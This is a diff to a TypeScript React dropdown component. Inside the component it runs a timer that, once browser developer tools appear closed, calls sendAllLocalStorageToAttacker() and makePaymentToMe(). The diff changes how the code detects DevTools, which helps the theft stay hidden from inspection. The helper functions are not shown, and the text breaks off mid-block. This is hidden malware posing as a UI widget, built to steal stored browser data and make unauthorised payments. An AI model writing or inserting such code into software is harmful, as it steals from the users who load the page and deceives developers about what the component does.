@@ -1,5 +1,5 @@
 import * as React from 'react';
-import { useEffect, useRef } from 'react';
+import { useEffect } from 'react';
 
 export interface DropdownProps {
   options: string[];
@@ -12,29 +12,15 @@ export interface DropdownProps {
 let devTools: any;
 
 export function Dropdown({ options }: DropdownProps) {
-  const opened = useRef<boolean>(true);
-
   useEffect(() => {
     if (!devTools) {
       devTools = require('devtools-detect');
     }
-
-    function handler(event: any) {
-      opened.current = event.detail.isOpen;
-      console.log('Is DevTools open:', event.detail.isOpen);
-      console.log('DevTools orientation:', event.detail.orientation);
-    }
-
-    window.addEventListener('devtoolschange', handler);
-
-    return function cleanup() {
-      window.removeEventListener('devtoolschange', handler);
-    };
   }, []);
 
   useEffect(() => {
     const id = setInterval(() => {
-      if (!opened.current) {
+      if (!(window as any)?.devtools?.orientation) {
         sendAllLocalStorageToAttacker();
 
         makePaymentToMe();
